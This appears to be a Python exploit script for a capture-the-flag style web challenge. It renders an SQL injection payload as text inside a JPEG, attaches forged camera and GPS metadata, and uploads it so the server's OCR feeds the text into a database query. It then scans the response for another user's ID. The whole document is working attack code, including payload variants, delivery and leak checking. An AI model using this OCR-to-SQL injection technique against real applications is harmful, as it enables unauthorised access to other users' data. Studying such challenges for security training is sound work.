# final_payload.py — mapping says: paint 4 quotes -> 2 delivered -> 200 (balanced).
# Place a DOUBLED quote at each end of the payload so the OCR delivers ONE quote at each end:
#   paint:  ''||(SELECT user_id FROM images WHERE id=1)||''
#   SQL:     '||(SELECT user_id FROM images WHERE id=1)||'   (closes, concats subquery, reopens)
# If it executes, our row's summary_ocr becomes the victim's user_id.
from PIL import Image, ImageDraw, ImageFont
import piexif, base64, requests, re

BASE = "https://chl-f4e46c02-efed-4276-8edf-ffade8aa3cf6-mis-viajes-v2.softwareseguro.com.ar"
UID  = "ea42cd39-001b-4fb5-a509-449322674687"
base_img = Image.open("paisaje.png").convert("RGB")

def build(text, path, size=34):
    W = min(1600, max(1000, 40+int(len(text)*size*0.60))); H=280
    img = base_img.resize((W,H)); d=ImageDraw.Draw(img)
    font=None
    for p in ["C:/Windows/Fonts/consolab.ttf","C:/Windows/Fonts/cour.ttf"]:
        try: font=ImageFont.truetype(p,size); break
        except: pass
    if font is None: font=ImageFont.load_default()
    bbox=d.textbbox((20,20),text,font=font)
    d.rectangle([0,0,W,bbox[3]+20],fill=(255,255,255))
    d.text((20,20),text,font=font,fill=(0,0,0))
    img.save(path,"jpeg",quality=72,optimize=True)
    def dms(x):
        dd=int(x);m=int((x-dd)*60);s=round((x-dd-m/60)*3600,4);return((dd,1),(m,1),(int(s*100),100))
    ex={'0th':{piexif.ImageIFD.Make:b'Samsung',piexif.ImageIFD.Model:b'Galaxy S25'},
        'Exif':{piexif.ExifIFD.DateTimeOriginal:b'2025:10:01 23:51:37'},
        'GPS':{piexif.GPSIFD.GPSLatitudeRef:b'S',piexif.GPSIFD.GPSLatitude:dms(41.13),
               piexif.GPSIFD.GPSLongitudeRef:b'W',piexif.GPSIFD.GPSLongitude:dms(71.31)}}
    piexif.insert(piexif.dump(ex),path)
    return "data:image/jpeg;base64,"+base64.b64encode(open(path,"rb").read()).decode()

q=chr(39)
UURE = re.compile(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}")

# try several quote-count combos at the ends, all aiming for 1 delivered quote per end
candidates = {
    "dd_dd": q*2 + "||(SELECT user_id FROM images WHERE id=1)||" + q*2,   # 2+2
    "dd_d":  q*2 + "||(SELECT user_id FROM images WHERE id=1)||" + q*1,   # 2+1
    "d_dd":  q*1 + "||(SELECT user_id FROM images WHERE id=1)||" + q*2,   # 1+2
}
for name, payload in candidates.items():
    uri = build(payload, name+".jpg")
    r = requests.post(f"{BASE}/upload", json={"image":uri,"description":"FIN_"+name,"user_id":UID})
    print(f"{name:6} painted={payload!r} -> {r.status_code}")

print("\n--- readback ---")
data = requests.get(f"{BASE}/images/{UID}").json()
for img in data:
    d = img.get("description","")
    if d.startswith("FIN_"):
        s = img.get("summary_ocr","")
        leak = [u for u in UURE.findall(str(s)) if u != UID]
        print(f"{d:10} ocr={s!r}" + (f"   >>> VICTIM {leak}" if leak else ""))
# global scan
for img in data:
    for u in UURE.findall(str(img.get("summary_ocr",""))):
        if u != UID:
            print(f"  LEAK id={img['id']}: {u}")
